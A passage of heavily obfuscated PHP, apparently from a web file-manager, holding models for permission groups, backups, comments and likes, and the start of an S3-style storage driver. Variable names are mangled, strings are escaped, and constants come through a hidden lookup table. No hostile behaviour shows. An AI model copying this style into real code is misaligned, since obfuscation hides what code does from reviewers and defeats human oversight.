$†ÛÊî©Ğ[228]) { continue; } if (!$şúÄÎ ¾) { $şúÄÎ ¾ = $É“¼º‘Ë; continue; } if ($şúÄÎ ¾[$†ÛÊî©Ğ[502]] > $É“¼º‘Ë[$†ÛÊî©Ğ[502]]) { $şúÄÎ ¾ = $É“¼º‘Ë; } } return $şúÄÎ ¾ ? $şúÄÎ ¾[$†ÛÊî©Ğ[487]] : $†ÛÊî©Ğ[12]; } public function listData($Î¶ÖÄÒ¿ = false, $“ë›Â” = "\x73\157\162\x74", $ï•óìã¦ = false) { return parent::listData($Î¶ÖÄÒ¿, $“ë›Â”, $ï•óìã¦); } public function update($êæØ«—‰, $×¸§ç¦) { $‘•†öí =& $_SERVER[µÅ˜º…æ]; $å¿ìµ‡ = parent::listData($êæØ«—‰); $ÍÑç¾ÎÚ = $this->findByName($×¸§ç¦[$‘•†öí[32]]); if (!$å¿ìµ‡ || $ÍÑç¾ÎÚ && $ÍÑç¾ÎÚ[$‘•†öí[487]] != $å¿ìµ‡[$‘•†öí[487]]) { return !1; } $this->filterAuth($×¸§ç¦[$‘•†öí[502]]); return parent::update($êæØ«—‰, $×¸§ç¦); } public function remove($Ğª ô´) { $úˆÒ¾Â™ = parent::listData($Ğª ô´); if (!$úˆÒ¾Â™ || $úˆÒ¾Â™[$_SERVER[µÅ˜º…æ][189]]) { return !1; } return parent::remove($Ğª ô´); } public function add($ö›ì¶÷ö = array()) { $ôº„óì =& $_SERVER[µÅ˜º…æ]; if ($this->findByName($ö›ì¶÷ö[$ôº„óì[32]])) { return !1; } $°ÉĞÆÃ• = array($ôº„óì[32] => $ôº„óì[12], $ôº„óì[502] => 1, $ôº„óì[2202] => $ôº„óì[2191], $ôº„óì[2201] => 1, $ôº„óì[189] => 0, $ôº„óì[2203] => 0); $ö›ì¶÷ö = array_merge($°ÉĞÆÃ•, $ö›ì¶÷ö); $ö›ì¶÷ö[$ôº„óì[2203]] = $this->getSort(); $this->filterAuth($ö›ì¶÷ö[$ôº„óì[502]]); return parent::insert($ö›ì¶÷ö); } private function getSort() { $³—“ÉëÌ =& $_SERVER[µÅ˜º…æ]; $…Ôáßß = parent::listData(); $øËÙ›÷ = array_to_keyvalue($…Ôáßß, $³—“ÉëÌ[12], $³—“ÉëÌ[2203]); return empty($øËÙ›÷) ? 0 : max($øËÙ›÷) + 1; } private function filterAuth(&$æ‹Å‚) { if (!$æ‹Å‚) { return; } $úíç•¸ó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $´Ú°Â² = array(); foreach ($úíç•¸ó as $‡„µ•) { if ($æ‹Å‚ & $‡„µ•) { $´Ú°Â²[] = $‡„µ•; } } if (in_array(self::AUTH_ROOT, $´Ú°Â²)) { $æ‹Å‚ = array_sum($úíç•¸ó); return; } $Š°…À—Ç = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($´Ú°Â² as $‡„µ•) { if (isset($Š°…À—Ç[$‡„µ•])) { $´Ú°Â² = array_merge($´Ú°Â², $Š°…À—Ç[$‡„µ•]); } } $´Ú°Â²[] = self::AUTH_SHOW; $æ‹Å‚ = array_sum(array_unique($´Ú°Â²)); } public function sort($³åï¶¿Ã, $ÍÀŸºÁ™) { return parent::update($³åï¶¿Ã, $ÍÀŸºÁ™); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\142\x61\x63\153\165\160\114\151\163\x74"; public $field = array("\151\x6f", "\156\141\155\x65", "\163\164\141\x74\x75\163", "\143\x6f\156\x74\x65\x6e\164", "\x6d\141\156\x75\x61\154", "\x72\145\x73\x75\154\x74", "\164\x69\155\x65\x46\162\x6f\x6d", "\164\151\x6d\145\124\x6f"); public $autoTask = "\141\x64\x6d\x69\156\x2e\x62\x61\143\153\x75\x70\56\141\165\x74\157\x54\141\163\153"; public $fileTask = "\x61\x64\x6d\151\156\56\142\x61\143\153\165\160\x2e\146\x69\x6c\x65\x54\x61\x73\x6b"; public function config($Ñ½œ¬è = false) { $²‰ŠùÛ =& $_SERVER[µÅ˜º…æ]; $„›ßéŒ¥ = $this->configSimple(); Action($²‰ŠùÛ[2204])->taskInit($„›ßéŒ¥); if (!$Ñ½œ¬è) { return $„›ßéŒ¥; } $Æ½üÌ“ = array(); if (Model($²‰ŠùÛ[872])->get($²‰ŠùÛ[2205], $²‰ŠùÛ[878]) == $²‰ŠùÛ[2206]) { Model($²‰ŠùÛ[1945])->cacheClear(); $Æ½üÌ“ = Model($²‰ŠùÛ[2207])->findByKey($²‰ŠùÛ[1564], $this->autoTask); if (!$Æ½üÌ“) { $Æ½üÌ“ = array(); } if (isset($Æ½üÌ“[$²‰ŠùÛ[204]])) { $Æ½üÌ“[$²‰ŠùÛ[204]] = json_decode($Æ½üÌ“[$²‰ŠùÛ[204]], !0); } if (isset($„›ßéŒ¥[$²‰ŠùÛ[204]])) { $Æ½üÌ“[$²‰ŠùÛ[204]][$²‰ŠùÛ[1949]] = $„›ßéŒ¥[$²‰ŠùÛ[204]]; unset($„›ßéŒ¥[$²‰ŠùÛ[204]]); } } $„›ßéŒ¥ = array_merge($Æ½üÌ“, $„›ßéŒ¥); if ($„›ßéŒ¥[$²‰ŠùÛ[168]] == $²‰ŠùÛ[943]) { $Å’‡æÅ = Model($²‰ŠùÛ[872])->get($²‰ŠùÛ[942], $²‰ŠùÛ[878]); $„›ßéŒ¥[$²‰ŠùÛ[2208]] = json_decode($Å’‡æÅ, !0); } return $„›ßéŒ¥; } public function configSimple() { $Ÿ¨»Åù• =& $_SERVER[µÅ˜º…æ]; $…äïç“Ñ = Model($Ÿ¨»Åù•[872])->get($Ÿ¨»Åù•[878]); $…äïç“Ñ = json_decode($…äïç“Ñ, !0); if (!$…äïç“Ñ) { $…äïç“Ñ = array($Ÿ¨»Åù•[1946] => 0); } $…äïç“Ñ[$Ÿ¨»Åù•[1946]] = _get($…äïç“Ñ, $Ÿ¨»Åù•[1946], 1); $this->parseContent($…äïç“Ñ); if ($…äïç“Ñ[$Ÿ¨»Åù•[168]] == $Ÿ¨»Åù•[943] && Model($Ÿ¨»Åù•[872])->get($Ÿ¨»Åù•[960]) == $Ÿ¨»Åù•[961]) { $…äïç“Ñ[$Ÿ¨»Åù•[168]] = $Ÿ¨»Åù•[1309]; } return $…äïç“Ñ; } public function listData($Ññ•…Óû = false, $¼™’®÷ñ = "\155\x6f\144\x69\146\x79\x54\151\155\x65", $ŠØ‰ÔÂì = false) { $ÆğÍû¾ = parent::listData($Ññ•…Óû, $¼™’®÷ñ, !0); if (!$ÆğÍû¾) { return $ÆğÍû¾; } if ($Ññ•…Óû) { $ÆğÍû¾ = array($ÆğÍû¾); } foreach ($ÆğÍû¾ as &$òÇÍÅòİ) { $this->parseContent($òÇÍÅòİ); } return $Ññ•…Óû ? $ÆğÍû¾[0] : $ÆğÍû¾; } public function parseContent(&$Ùë™Ô€¯) { $åˆ„£Ä =& $_SERVER[µÅ˜º…æ]; $¯Öâ‚¬¾ = _get($Ùë™Ô€¯, $åˆ„£Ä[168], $åˆ„£Ä[91]); if (!in_array($¯Öâ‚¬¾, array($åˆ„£Ä[943], $åˆ„£Ä[1309]))) { $Ùë™Ô€¯[$åˆ„£Ä[168]] = $¯Öâ‚¬¾ == $åˆ„£Ä[91] ? $åˆ„£Ä[1309] : $åˆ„£Ä[943]; } } public function lastItem() { $İù™¸ŒŒ = $this->listData(); return !empty($İù™¸ŒŒ[0]) ? $İù™¸ŒŒ[0] : null; } public function kill($µÙÎ‡¯Æ) { $’ôµª© =& $_SERVER[µÅ˜º…æ]; $Æ²ïª÷ = $this->listData($µÙÎ‡¯Æ); if (!$Æ²ïª÷ || empty($Æ²ïª÷[$’ôµª©[32]])) { return !0; } Task::kill($’ôµª©[885]); Task::kill($’ôµª©[905]); Task::kill($’ôµª©[916]); $ÌÇ„¿˜ø = $Æ²ïª÷[$’ôµª©[32]]; $£ª¿Ğµ§ = TEMP_FILES . $’ôµª©[881] . $ÌÇ„¿˜ø . $’ôµª©[8]; IO::remove($£ª¿Ğµ§, !1); return $this->remove($µÙÎ‡¯Æ); } public function remove($ïø¹öº•) { $Ö™’Å´ = $this->listData($ïø¹öº•); if (!$Ö™’Å´) { return !0; } return $this->backupRemove($Ö™’Å´); } private function backupRemove($õªİ–€) { parent::remove($õªİ–€[$_SERVER[µÅ˜º…æ][487]]); $ÙĞŒŸ¾‘ = $this->backupPath($õªİ–€); IO::remove($ÙĞŒŸ¾‘, !1); return !0; } private function backupPath($›îÀ™¯Ÿ) { $¨ıéâ¦« =& $_SERVER[µÅ˜º…æ]; $â®¬é„ = $›îÀ™¯Ÿ[$¨ıéâ¦«[32]]; $‹æÜ«è÷ = Model($¨ıéâ¦«[872])->get($¨ıéâ¦«[873]); $·ŞµÌ™¥ = substr(md5($¨ıéâ¦«[874] . $‹æÜ«è÷ . $â®¬é„), 0, 8); return "\173\x69\157\x3a{$›îÀ™¯Ÿ[$¨ıéâ¦«[851]]}\x7d\57\144\141\x74\141\142\x61\163\145\x2f\x62\141\x63\x6b\x75\x70\x2f" . $â®¬é„ . $¨ıéâ¦«[11] . $·ŞµÌ™¥; } public function start($Ï«Óé®Õ = "\144\142") { $¸¼¥ôË =& $_SERVER[µÅ˜º…æ]; if ($GLOBALS[$¸¼¥ôË[6]][$¸¼¥ôË[92]][$¸¼¥ôË[2209]] != $¸¼¥ôË[91]) { return !0; } $¼ò’ıªŒ = $this->configSimple(); if (!$¼ò’ıªŒ || $¼ò’ıªŒ[$¸¼¥ôË[1946]] != $¸¼¥ôË[91]) { return !1; } if ($Ï«Óé®Õ == $¸¼¥ôË[230]) { return $this->bakFile($¼ò’ıªŒ); } $ëò·’‹Å = $this->process(); foreach ($ëò·’‹Å as $¢‹ÍŠàš) { if ($¢‹ÍŠàš) { return Task::restart($¢‹ÍŠàš[$¸¼¥ôË[487]]); } } $Í¤ÀÇ‘„ = new Backup(); if (!$Í¤ÀÇ‘„ || $Í¤ÀÇ‘„->message) { return !1; } $ğ™áÅ»¶ = $Í¤ÀÇ‘„->db(); if ($ğ™áÅ»¶) { $ğ™áÅ»¶ = $Í¤ÀÇ‘„->dbFile(); if ($ğ™áÅ»¶ && $¼ò’ıªŒ[$¸¼¥ôË[168]] == $¸¼¥ôË[943]) { $ğ™áÅ»¶ = $Í¤ÀÇ‘„->file(); } } Backup::set(array($¸¼¥ôË[849] => 1, $¸¼¥ôË[861] => time())); return !0; } public function process() { $É–­›¬ =& $_SERVER[µÅ˜º…æ]; $®½šãóÙ = array($É–­›¬[857] => Task::get($É–­›¬[885]), $É–­›¬[862] => Task::get($É–­›¬[905]), $É–­›¬[230] => Task::get($É–­›¬[916])); $ÒÚ…®±Å = !1; foreach ($®½šãóÙ as &$µğ©¨áö) { if ($ÒÚ…®±Å) { $µğ©¨áö = !1; continue; } if ($µğ©¨áö) { $¤Ÿ„Üñ‘ = intval(_get($µğ©¨áö, $É–­›¬[1980], 0)); if (time() - $¤Ÿ„Üñ‘ > 7200) { Task::kill($µğ©¨áö[$É–­›¬[487]]); $ÒÚ…®±Å = !0; $µğ©¨áö = !1; } } } return $®½šãóÙ; } public function bakFile($ú±˜ÊÛ) { $®ÔÛÙû³ =& $_SERVER[µÅ˜º…æ]; if ($ú±˜ÊÛ[$®ÔÛÙû³[168]] == $®ÔÛÙû³[1309]) { return !1; } Model($®ÔÛÙû³[1945])->cacheClear(); $Ñò¤ÖÆ = Model($®ÔÛÙû³[2207])->findByKey($®ÔÛÙû³[1564], $this->fileTask); if (!$Ñò¤ÖÆ) { return !1; } $÷ÎÀ¥¿ = json_decode($Ñò¤ÖÆ[$®ÔÛÙû³[204]], !0); if (!$÷ÎÀ¥¿ || $÷ÎÀ¥¿[$®ÔÛÙû³[33]] != $®ÔÛÙû³[1958]) { return !1; } $÷ÎÀ¥¿ = intval($÷ÎÀ¥¿[$®ÔÛÙû³[1958]]); if ($÷ÎÀ¥¿ <= 0) { return !1; } $¦¿¨ÄÆä = new BackupFile(!0); return $¦¿¨ÄÆä->start($ú±˜ÊÛ[$®ÔÛÙû³[851]], $÷ÎÀ¥¿); } public function restore() { $ù²µš† =& $_SERVER[µÅ˜º…æ]; ActionCall($ù²µš†[2210], !0, 1); ActionCall($ù²µš†[2210], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\145" => "\143\157\x6d\x6d\x65\156\x74\137\155\145\x74\x61", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\143\x6f\x6d\x6d\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Å‘†Õ”™) { $˜½ƒ‚È =& $_SERVER[µÅ˜º…æ]; if ($Å‘†Õ”™[$˜½ƒ‚È[2211]]) { $Ù–×Ó = $this->where(array($˜½ƒ‚È[2212] => $Å‘†Õ”™[$˜½ƒ‚È[2211]]))->find(); if (!$Ù–×Ó || $Ù–×Ó[$˜½ƒ‚È[188]] != $Å‘†Õ”™[$˜½ƒ‚È[188]] || $Ù–×Ó[$˜½ƒ‚È[589]] != $Å‘†Õ”™[$˜½ƒ‚È[589]]) { return !1; } $this->where(array($˜½ƒ‚È[2212] => $Å‘†Õ”™[$˜½ƒ‚È[2211]]))->setAdd($˜½ƒ‚È[2213], 1); } $Å‘†Õ”™[$˜½ƒ‚È[2214]] = 0; $Å‘†Õ”™[$˜½ƒ‚È[2213]] = 0; $Å‘†Õ”™[$˜½ƒ‚È[849]] = 1; return $this->add($Å‘†Õ”™); } public function commentCount($ß»Åş·ä, $èÂ£ÑËá, $¹¯¡úå¿ = false) { $€¿€‚úî =& $_SERVER[µÅ˜º…æ]; if (!$ß»Åş·ä) { return array(); } if (is_string($ß»Åş·ä) || is_int($ß»Åş·ä)) { $ß»Åş·ä = array($ß»Åş·ä); } $Š•ÄÑ„ò = array($€¿€‚úî[589], $€¿€‚úî[2215] => $€¿€‚úî[585]); $éòŞ—ø = array($€¿€‚úî[589] => array($€¿€‚úî[7], $ß»Åş·ä), $€¿€‚úî[188] => $èÂ£ÑËá); if ($¹¯¡úå¿) { $éòŞ—ø[$€¿€‚úî[1593]] = $¹¯¡úå¿; } $ªáãë÷Ü = $this->field($Š•ÄÑ„ò)->where($éòŞ—ø)->group($€¿€‚úî[589])->select(); return array_to_keyvalue($ªáãë÷Ü, $€¿€‚úî[589], $€¿€‚úî[585]); } public function starTarget($«¼¾ºÅ, $¥ğª“·‰) { $²¸ÙäÏ‰ =& $_SERVER[µÅ˜º…æ]; $ÉÉıØØ± = $«¼¾ºÅ + self::TYPE_STAR_OFFSET; $İ½ß¿’ = array($²¸ÙäÏ‰[1593] => USER_ID, $²¸ÙäÏ‰[188] => $ÉÉıØØ±, $²¸ÙäÏ‰[589] => $¥ğª“·‰); $şÀÍº¦û = $this->where($İ½ß¿’)->find(); if ($şÀÍº¦û) { return $this->where(array($²¸ÙäÏ‰[487] => $şÀÍº¦û[$²¸ÙäÏ‰[487]]))->delete(); } $´Ğ©åôÉ = array($²¸ÙäÏ‰[2211] => 0, $²¸ÙäÏ‰[1593] => USER_ID, $²¸ÙäÏ‰[849] => 1, $²¸ÙäÏ‰[168] => $²¸ÙäÏ‰[12], $²¸ÙäÏ‰[188] => $ÉÉıØØ±, $²¸ÙäÏ‰[589] => $¥ğª“·‰, $²¸ÙäÏ‰[2214] => 0, $²¸ÙäÏ‰[2213] => 0); return $this->add($´Ğ©åôÉ); } public function starTargetCount($ôı‹šá§, $Šà³û·Ã) { $£ò¤£ÖÍ =& $_SERVER[µÅ˜º…æ]; $òÕÈ† … = $Šà³û·Ã + self::TYPE_STAR_OFFSET; $îÀá³Š = $this->commentCount($ôı‹šá§, $òÕÈ† …); $¤Û²é²› = $this->commentCount($ôı‹šá§, $òÕÈ† …, USER_ID); return array($£ò¤£ÖÍ[2216] => $îÀá³Š, $£ò¤£ÖÍ[2217] => $¤Û²é²›); } public function starTargetUserList($–Äà×— , $ÂÒ ¨Ïô) { $‹›ï­™® =& $_SERVER[µÅ˜º…æ]; $ãÂÃğ­á = $–Äà×—  + self::TYPE_STAR_OFFSET; $³¿”º„º = array($‹›ï­™®[589] => $ÂÒ ¨Ïô, $‹›ï­™®[188] => $ãÂÃğ­á); $ĞÒšè€Á = $this->where($³¿”º„º)->count(); $„ãç×ŒÌ = array($‹›ï­™®[332] => $ĞÒšè€Á, $‹›ï­™®[2218] => array()); if (!$ĞÒšè€Á) { return $„ãç×ŒÌ; } $Íş«èô¨ = $this->field($‹›ï­™®[1593])->where($³¿”º„º)->limit(500)->select(); $Íş«èô¨ = array_to_keyvalue($Íş«èô¨, $‹›ï­™®[12], $‹›ï­™®[1593]); $„ãç×ŒÌ[$‹›ï­™®[2218]] = Model($‹›ï­™®[597])->userListInfo($Íş«èô¨); return $„ãç×ŒÌ; } public function prasiseUserList($‡å¯ƒ) { $•ƒóóš =& $_SERVER[µÅ˜º…æ]; $õÀ·é‰é = array($•ƒóóš[2219] => $‡å¯ƒ); $ªö³¼‘ò = $this->where($õÀ·é‰é)->find(); $äû‘™î³ = _get($ªö³¼‘ò, $•ƒóóš[2214], 0); $ÅÖù¤¦¼ = array($•ƒóóš[332] => $äû‘™î³, $•ƒóóš[2218] => array()); if (!$äû‘™î³) { return $ÅÖù¤¦¼; } $¸º•“Š¼ = Model($•ƒóóš[2220])->field($•ƒóóš[1593])->where($õÀ·é‰é)->limit(500)->select(); $¸º•“Š¼ = array_to_keyvalue($¸º•“Š¼, $•ƒóóš[12], $•ƒóóš[1593]); $ÅÖù¤¦¼[$•ƒóóš[2218]] = Model($•ƒóóš[597])->userListInfo($¸º•“Š¼); return $ÅÖù¤¦¼; } public function remove($©ûÜëîü) { $ÆÊ¹»½Ê =& $_SERVER[µÅ˜º…æ]; $¶îëøÅí = array($ÆÊ¹»½Ê[2212] => $©ûÜëîü); $„èÃÓÌæ = $this->where($¶îëøÅí)->find(); if ($„èÃÓÌæ[$ÆÊ¹»½Ê[2211]]) { $this->where(array($ÆÊ¹»½Ê[2212] => $„èÃÓÌæ[$ÆÊ¹»½Ê[2211]]))->setAdd($ÆÊ¹»½Ê[2213], -1); } return $this->removeArray($©ûÜëîü); } public function edit($Ê‡‚¿, $Ôñ°©­È) { $›×ã¿•ç =& $_SERVER[µÅ˜º…æ]; $åŒ¿Ğí = array($›×ã¿•ç[2212] => $Ê‡‚¿); return $this->where($åŒ¿Ğí)->save(array($›×ã¿•ç[2221] => $Ôñ°©­È)); } public function prasise($İßÀÛ½Ä) { $ÅÎ“Ïº¾ =& $_SERVER[µÅ˜º…æ]; $Œ¶çÜ¢­ = Model($ÅÎ“Ïº¾[2222]); $—Ö³ØãÏ = array($ÅÎ“Ïº¾[2212] => $İßÀÛ½Ä, $ÅÎ“Ïº¾[1967] => USER_ID); $Úİ‹£Öä = $Œ¶çÜ¢­->where($—Ö³ØãÏ)->find(); if (!$Úİ‹£Öä) { $Œ¶çÜ¢­->add($—Ö³ØãÏ); $³Ú·®ù = $this->where(array($ÅÎ“Ïº¾[2212] => $İßÀÛ½Ä))->setAdd($ÅÎ“Ïº¾[2214], 1); } else { $Œ¶çÜ¢­->where($—Ö³ØãÏ)->delete(); $³Ú·®ù = $this->where(array($ÅÎ“Ïº¾[2212] => $İßÀÛ½Ä))->setAdd($ÅÎ“Ïº¾[2214], -1); } return $³Ú·®ù; } public function targetInfo($Û«ëş”å, $ÏØÌìÓã) { $Ï¨óÆ»Ì =& $_SERVER[µÅ˜º…æ]; $Ô­Õ× = array($Ï¨óÆ»Ì[670] => $Û«ëş”å, $Ï¨óÆ»Ì[671] => $ÏØÌìÓã); $Îêì£ƒ = $this->where($Ô­Õ×)->count(); $««îõÕå = "\122\111\x47\x48\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\x63\x6f\155\155\x65\x6e\164\137\x70\x72\x61\x69\163\145\40\x73\164\x61\x72\40\157\156\40\143\157\x6d\155\x65\156\164\56\143\157\155\x6d\x65\x6e\x74\x49\x44\40\x3d\40\x73\164\141\x72\56\x63\x6f\155\155\145\156\x74\x49\104"; $¼¸ÜÉ  = $this->alias($Ï¨óÆ»Ì[429])->where($Ô­Õ×)->join($««îõÕå, $Ï¨óÆ»Ì[2223])->count(); $¤Ğ†¢¡¼ = array($Ï¨óÆ»Ì[2224] => $Îêì£ƒ, $Ï¨óÆ»Ì[2225] => $¼¸ÜÉ ); return $¤Ğ†¢¡¼; } public function listData($­å·ïÜ…) { $‚âÙâ®“ =& $_SERVER[µÅ˜º…æ]; if (isset($­å·ïÜ…[$‚âÙâ®“[2226]])) { if ($­å·ïÜ…[$‚âÙâ®“[2226]]) { $­å·ïÜ…[$‚âÙâ®“[2219]] = array($‚âÙâ®“[1183], intval($­å·ïÜ…[$‚âÙâ®“[2226]])); } unset($­å·ïÜ…[$‚âÙâ®“[2226]]); } if (isset($­å·ïÜ…[$‚âÙâ®“[2227]])) { if ($­å·ïÜ…[$‚âÙâ®“[2227]]) { $­å·ïÜ…[$‚âÙâ®“[2219]] = array($‚âÙâ®“[1180], intval($­å·ïÜ…[$‚âÙâ®“[2227]])); } unset($­å·ïÜ…[$‚âÙâ®“[2227]]); } return $this->_listData($­å·ïÜ…); } private function _listData($ıÒºãä ) { $Âî˜¿Ü =& $_SERVER[µÅ˜º…æ]; $şÊ£æ€Ñ = $this->where($ıÒºãä )->_makeOrder()->selectPage(100); $this->_listAppendParent($şÊ£æ€Ñ[$Âî˜¿Ü[446]]); $this->_listAppendUser($şÊ£æ€Ñ[$Âî˜¿Ü[446]]); $this->_listAppendMeta($şÊ£æ€Ñ[$Âî˜¿Ü[446]]); return $şÊ£æ€Ñ; } private function _makeOrder() { $ïû”¬İ =& $_SERVER[µÅ˜º…æ]; $‡Í°Û°ì = array($ïû”¬İ[2214], $ïû”¬İ[2213], $ïû”¬İ[231]); $á±ş…ü¤ = Input::get($ïû”¬İ[544], $ïû”¬İ[7], $ïû”¬İ[512], $‡Í°Û°ì); $ú®¸É¢· = Input::get($ïû”¬İ[545], $ïû”¬İ[7], $ïû”¬İ[1969], array($ïû”¬İ[2228], $ïû”¬İ[540])); $Àñù½ƒŠ = $á±ş…ü¤ . $ïû”¬İ[53] . $ú®¸É¢·; return $this->order($Àñù½ƒŠ); } private function _listAppendParent(&$‚Êúûë) { $—àñ¤İ =& $_SERVER[µÅ˜º…æ]; $çÍ–Ï×ñ = array_unique(array_to_keyvalue($‚Êúûë, $—àñ¤İ[12], $—àñ¤İ[2211])); $çÍ–Ï×ñ = array_remove_value($çÍ–Ï×ñ, $—àñ¤İ[228]); if (!$çÍ–Ï×ñ) { return; } $Ä¤ŠÃÄö = $this->where(array($—àñ¤İ[2212] => array($—àñ¤İ[7], $çÍ–Ï×ñ)))->select(); $Ä¤ŠÃÄö = array_to_keyvalue($Ä¤ŠÃÄö, $—àñ¤İ[2219]); foreach ($‚Êúûë as &$‡®„åĞ¶) { if (isset($Ä¤ŠÃÄö[$‡®„åĞ¶[$—àñ¤İ[2211]]])) { $‡®„åĞ¶[$—àñ¤İ[2229]] = $Ä¤ŠÃÄö[$‡®„åĞ¶[$—àñ¤İ[2211]]]; } } unset($‡®„åĞ¶); } private function _listAppendUser(&$²î¨“„½) { $³â«ı¾¶ =& $_SERVER[µÅ˜º…æ]; $†ãüçÄ¨ = array_unique(array_to_keyvalue($²î¨“„½, $³â«ı¾¶[12], $³â«ı¾¶[1593])); $†ãüçÄ¨ = array_remove_value($†ãüçÄ¨, $³â«ı¾¶[228]); if (count($†ãüçÄ¨) == 0) { return; } foreach ($²î¨“„½ as $·ş¿”–) { if (isset($·ş¿”–[$³â«ı¾¶[2229]])) { $†ãüçÄ¨[] = $·ş¿”–[$³â«ı¾¶[2229]][$³â«ı¾¶[1593]]; } } $€œØğÄï = Model($³â«ı¾¶[617])->userListInfo($†ãüçÄ¨); foreach ($²î¨“„½ as &$·ş¿”–) { $·ş¿”–[$³â«ı¾¶[684]] = $€œØğÄï[$·ş¿”–[$³â«ı¾¶[1593]]]; if (isset($·ş¿”–[$³â«ı¾¶[2229]])) { $·ş¿”–[$³â«ı¾¶[2229]][$³â«ı¾¶[684]] = $€œØğÄï[$·ş¿”–[$³â«ı¾¶[2229]][$³â«ı¾¶[1593]]]; } } unset($·ş¿”–); } private function _listAppendMeta(&$êª–öÒ§) { $éïŸÒ¡ =& $_SERVER[µÅ˜º…æ]; $òˆ×˜× = array_unique(array_to_keyvalue($êª–öÒ§, $éïŸÒ¡[12], $éïŸÒ¡[2219])); $òˆ×˜× = array_remove_value($òˆ×˜×, $éïŸÒ¡[228]); if (!$òˆ×˜×) { return; } foreach ($êª–öÒ§ as $ŸÊû§¤ù) { if (isset($ŸÊû§¤ù[$éïŸÒ¡[2229]])) { $òˆ×˜×[] = $ŸÊû§¤ù[$éïŸÒ¡[2229]][$éïŸÒ¡[2219]]; } } $ìÕ¡âò = $this->metaList($òˆ×˜×); if (!$ìÕ¡âò) { return !1; } foreach ($êª–öÒ§ as &$ŸÊû§¤ù) { $ŸÊû§¤ù[$éïŸÒ¡[555]] = $ìÕ¡âò[$ŸÊû§¤ù[$éïŸÒ¡[2219]]]; if (isset($ŸÊû§¤ù[$éïŸÒ¡[2229]])) { $ŸÊû§¤ù[$éïŸÒ¡[2229]][$éïŸÒ¡[555]] = $ìÕ¡âò[$ŸÊû§¤ù[$éïŸÒ¡[2229]][$éïŸÒ¡[2219]]]; } } unset($ŸÊû§¤ù); } private function metaList($²ßİÎƒ‰) { $œšªµ³Õ =& $_SERVER[µÅ˜º…æ]; if (!$²ßİÎƒ‰) { return array(); } $ëù°àğ° = array($œšªµ³Õ[2219] => array($œšªµ³Õ[7], $²ßİÎƒ‰)); $½¼üÔÔĞ = Model($œšªµ³Õ[2230])->where($ëù°àğ°)->select(); $½¼üÔÔĞ = array_to_keyvalue_group($½¼üÔÔĞ, $œšªµ³Õ[2219]); foreach ($½¼üÔÔĞ as $ÛÆªŠ˜† => $ÁåÇ´ÑÀ) { $²©Ì¾Òæ = array(); foreach ($ÁåÇ´ÑÀ as $³¡Êº¦Ê) { $²©Ì¾Òæ[$³¡Êº¦Ê[$œšªµ³Õ[95]]] = $³¡Êº¦Ê[$œšªµ³Õ[451]]; } $½¼üÔÔĞ[$ÛÆªŠ˜†] = $²©Ì¾Òæ; } return $½¼üÔÔĞ ? $½¼üÔÔĞ : array(); } public function removeTarget($…·²Ê, $¶Œ±–É½) { $¢£€±í® =& $_SERVER[µÅ˜º…æ]; if (!$¶Œ±–É½) { return !0; } $¶Œ±–É½ = is_array($¶Œ±–É½) ? $¶Œ±–É½ : array($¶Œ±–É½); $ª®çŞç = array($¢£€±í®[188] => $…·²Ê, $¢£€±í®[589] => array($¢£€±í®[7], $¶Œ±–É½)); $äûÔšÁ• = $this->field($¢£€±í®[2219])->where($ª®çŞç)->select(); $ºÃ¡æ¥û = array_to_keyvalue($äûÔšÁ•, $¢£€±í®[12], $¢£€±í®[2219]); return $this->removeArray($ºÃ¡æ¥û); } public function removeArray($šüÇÔé) { $àˆ¦•ŞÑ =& $_SERVER[µÅ˜º…æ]; if (!$šüÇÔé) { return !0; } $šüÇÔé = is_array($šüÇÔé) ? $šüÇÔé : array($šüÇÔé); $àìë•†¦ = array($àˆ¦•ŞÑ[2219] => array($àˆ¦•ŞÑ[7], $šüÇÔé)); Model($àˆ¦•ŞÑ[2222])->where($àìë•†¦)->delete(); Model($àˆ¦•ŞÑ[2231])->where($àìë•†¦)->delete(); return $this->where($àìë•†¦)->delete(); } } goto AêŞ¢ŞÉ; eÆ±ôÏÃó: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($âÀ­‚»”) { parent::__construct($âÀ­‚»”); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } public function uploadFormData($—ÍÊ˜Ù, $Ì½ÆÊº¨ = 3600) { $ÀÂ÷ŸÛ³ =& $_SERVER[µÅ˜º…æ]; $õÚ¹ÇŸ¹ = $ÀÂ÷ŸÛ³[229]; $´ëƒŞä³ = $ÀÂ÷ŸÛ³[257]; $‘€¼ä‚ı = $ÀÂ÷ŸÛ³[62]; $ñ¨ªˆ— = gmdate($ÀÂ÷ŸÛ³[258]); $ª€€»ƒÊ = gmdate($ÀÂ÷ŸÛ³[259]); $½·± Ù­ = $ÀÂ÷ŸÛ³[260]; $Õ°ã‰µ· = $Ì½ÆÊº¨ . $ÀÂ÷ŸÛ³[12]; $ìÃ©à†¼ = $ÀÂ÷ŸÛ³[261]; $ß¥÷‡Òå = array($this->accessKey, $ª€€»ƒÊ, $this->region, $‘€¼ä‚ı, $½·± Ù­); $¹™šÂÌ = implode($ÀÂ÷ŸÛ³[8], $ß¥÷‡Òå); $‡äïâ˜Ã = array($ÀÂ÷ŸÛ³[262] => gmdate($ÀÂ÷ŸÛ³[1526], strtotime($ÀÂ÷ŸÛ³[264])), $ÀÂ÷ŸÛ³[265] => array(array($ÀÂ÷ŸÛ³[266] => 